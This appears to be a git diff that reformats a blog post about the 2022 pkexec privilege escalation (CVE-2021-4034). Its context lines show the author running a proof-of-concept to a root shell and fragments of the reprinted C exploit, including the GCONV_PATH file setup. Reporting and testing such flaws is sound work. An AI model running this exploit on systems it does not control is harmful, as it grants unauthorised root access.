@@ -2,8 +2,9 @@
 title: 'Local Privilege Escalation in polkits pkexec'
 description: ''
 date: 2022-01-26
-tags: [ 'cve', 'security', 'vuln' ]
+tags: ['cve', 'security', 'vuln']
 ---
+
 The big news in Linux today is the [Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)](https://seclists.org/oss-sec/2022/q1/90), with [Arstechnica](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) leading with, "_A bug lurking for 12 years gives attackers root on every major Linux distro - It's likely only a matter of time before PwnKit is exploited in the wild_" Needless to say, I immediately had to try it out on my own, so I got on one of my [Debian GNU/Linux](https://debian.org) servers to test it. Spoiler: it worked, here's how you can try it too.
 
 ## Howto
@@ -18,7 +19,7 @@ $ ./pkexec-poc
 [~] maybe get shell now?
 # id
 uid=0(root) gid=0(root) groups=0(root),27(sudo),1000(fak3r)
-# 
+#
 ```
 
 ## Workaround fix (temporary)
@@ -43,7 +44,7 @@ In case the C code is pulled, here's it is, again, I grabbed it from [haxx.in](h
 
 ```
 /*
- * blasty-vs-pkexec.c -- by blasty <peter@haxx.in> 
+ * blasty-vs-pkexec.c -- by blasty <peter@haxx.in>
  * ------------------------------------------------
  * PoC for CVE-2021-4034, shout out to Qualys
  *
@@ -112,7 +113,7 @@ int main(int argc, char *argv[]) {
         if(mkdir("GCONV_PATH=.", 0777) < 0) {
             fatal("mkdir");
         }
-        int fd = open("GCONV_PATH=./lol", O_CREAT|O_RDWR, 0777); 
+        int fd = open("GCONV_PATH=./lol", O_CREAT|O_RDWR, 0777);
         if (fd < 0) {
             fatal("open");
         }
